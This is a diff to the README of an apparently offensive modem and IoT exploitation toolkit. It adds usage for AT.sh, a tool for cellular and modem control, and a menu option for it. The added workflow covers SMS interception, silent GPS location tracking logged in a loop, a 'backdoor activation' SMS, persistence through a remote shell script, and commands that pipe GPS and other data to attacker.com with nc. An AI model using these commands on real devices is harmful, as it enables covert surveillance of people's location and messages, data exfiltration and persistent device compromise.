@@ -59,6 +59,7 @@ TIME: [REDACTED]
 │ rce.sh                  │ Remote shell injection             │
 │ fw-update.sh            │ Firmware implant installer         │
 │ logger.sh               │ Traffic intercept & analysis       │
+│ AT.sh                   │ AT command control & exploitation  │
 │ menu.sh                 │ Command & control interface        │
 └──────────────────────────────────────────────────────────────┘
 ```
@@ -270,10 +271,115 @@ Encryption keys: 1
 [3] Remote Shell           - Execute arbitrary code
 [4] Firmware Implant       - Install persistent backdoor
 [5] Traffic Intercept      - Monitor communications
+[6] AT Command Control     - Cellular & modem exploitation
 [d] Target Discovery       - Scan for devices
 [c] Configure Attack       - Set parameters
 
 Select your weapon: _
+```
+
+---
+
+### [EXPLOIT 07] :: AT COMMAND CONTROL
+**AT.sh** - Cellular/Modem exploitation and control
+
+```bash
+[root@xploitoverload]# ./AT.sh test
+[*] Probing modem device...
+[*] Sending AT handshake...
+[✓] AT connection established
+[✓] Device is responsive
+[*] SIM status: OK
+[*] Signal strength: -75 dBm
+```
+
+**CAPABILITIES:**
+- Modem/Cellular device control
+- SIM/Network status enumeration
+- SMS interception and sending
+- GPS location tracking
+- Signal quality monitoring
+- Network operator enumeration
+- WiFi network scanning (ESP32/ESP8266)
+- Custom command injection
+
+**ATTACK VECTORS:**
+```bash
+# Network intelligence gathering
+./AT.sh network-status
+./AT.sh operator
+./AT.sh signal-quality
+
+# SMS interception
+./AT.sh sms-list UNREAD
+./AT.sh sms-list ALL
+
+# GPS location tracking
+./AT.sh gps-on
+./AT.sh gps-info
+
+# Send SMS backdoor activation
+./AT.sh sms-send "+1234567890" "ACTIVATE_BACKDOOR"
+
+# Custom AT commands
+./AT.sh send "AT+CIFSR"     # IP address
+./AT.sh send "AT+CREG?"     # Network registration
+./AT.sh send "AT+CBC"       # Battery status
+
+# Create custom exploit commands
+./AT.sh add-custom "extract_location" "at" "AT+CGPSINFO"
+./AT.sh add-custom "trigger_sms" "bash" "echo 'sms sent' | nc attacker.com 4444"
+```
+
+**EXPLOITATION WORKFLOW:**
+```bash
+# 1. Identify target modem
+./AT.sh -b 9600 test
+./AT.sh -b 19200 test
+./AT.sh -b 115200 test
+
+# 2. Gather intelligence
+echo "[*] Extracting device info..."
+./AT.sh info
+./AT.sh list-commands
+
+# 3. Monitor network activity
+echo "[*] Monitoring network..."
+./AT.sh network-status
+./AT.sh signal-quality
+
+# 4. Intercept communications
+echo "[*] Checking SMS messages..."
+./AT.sh sms-list UNREAD
+
+# 5. Deploy backdoor via custom commands
+echo "[*] Installing persistence..."
+./AT.sh add-custom "persistence" "bash" "./rce.sh shell &"
+
+# 6. Track location silently
+echo "[*] Activating GPS..."
+./AT.sh gps-on
+./AT.sh gps-info | nc attacker.com 5555
+```
+
+**ADVANCED EXPLOITATION:**
+```bash
+# Firmware profiling
+./AT.sh info | grep -i "firmware\|version"
+
+# GPS coordinates extraction
+./AT.sh gps-on
+while true; do
+    ./AT.sh gps-info | grep -oP 'Lat:\K[^,]+|Lon:\K[^,]+' | tr '\n' ',' >> location_log.txt
+    sleep 10
+done
+
+# Network enumeration
+./AT.sh list-operators  # List all available networks
+./AT.sh operator        # Current network info
+
+# WiFi scanning (IoT devices)
+./AT.sh send "AT+CWLAP" # List available WiFi networks
 ```
 
 ---
@@ -299,6 +405,9 @@ Select your weapon: _
 # Set up attack parameters
 export UART_PORT=/dev/ttyUSB0
 export BAUD_UART=115200
+
+# Test AT command interface
+./AT.sh test
 
 # Test connectivity
 ./logger.sh tail
